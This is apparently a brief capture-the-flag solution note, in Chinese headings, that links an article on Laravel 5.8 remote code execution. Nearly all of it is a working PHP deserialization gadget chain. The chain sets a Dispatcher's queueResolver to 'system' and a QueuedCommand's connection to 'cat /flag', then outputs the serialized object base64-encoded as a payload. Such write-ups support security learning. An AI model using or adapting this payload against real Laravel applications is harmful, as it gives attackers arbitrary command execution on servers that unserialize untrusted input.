# 知识点
[Laravel 5.8 RCE 分析 - 先知社区](https://xz.aliyun.com/t/6059)
# 思路
```php
<?php
namespace Illuminate\Broadcasting
{
    use Illuminate\Bus\Dispatcher;
    use Illuminate\Foundation\Console\QueuedCommand;
    class PendingBroadcast
    {
        protected $events;
        protected $event;

        public function __construct()
        {
            $this->events = new Dispatcher();
            $this->event = new QueuedCommand();
        }

    }
}

namespace Illuminate\Foundation\Console
{
    class QueuedCommand
    {
        public $connection = 'cat /flag';
    }
}

namespace Illuminate\Bus
{

    class Dispatcher
    {
        protected $queueResolver;

        public function __construct()
        {
            $this->queueResolver='system';
        }

    }
}

namespace
{

    use Illuminate\Broadcasting\PendingBroadcast;

    echo base64_encode(serialize(new PendingBroadcast()));
}

```
